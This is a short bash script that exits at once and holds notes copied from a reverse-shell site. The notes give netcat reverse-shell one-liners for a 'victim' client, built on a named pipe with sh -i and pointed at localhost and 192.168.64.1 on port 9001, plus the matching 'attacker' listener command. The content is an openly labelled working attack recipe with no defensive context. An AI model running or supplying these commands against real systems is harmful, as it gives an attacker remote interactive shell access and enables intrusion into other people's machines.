#!/usr/bin/env bash
echo cat $0
exit 1

# from: https://www.revshells.com/
client (victim):
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc localhost 9001 >/tmp/f
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.64.1 9001 >/tmp/f

server (attacker):
	nc -lvn 9001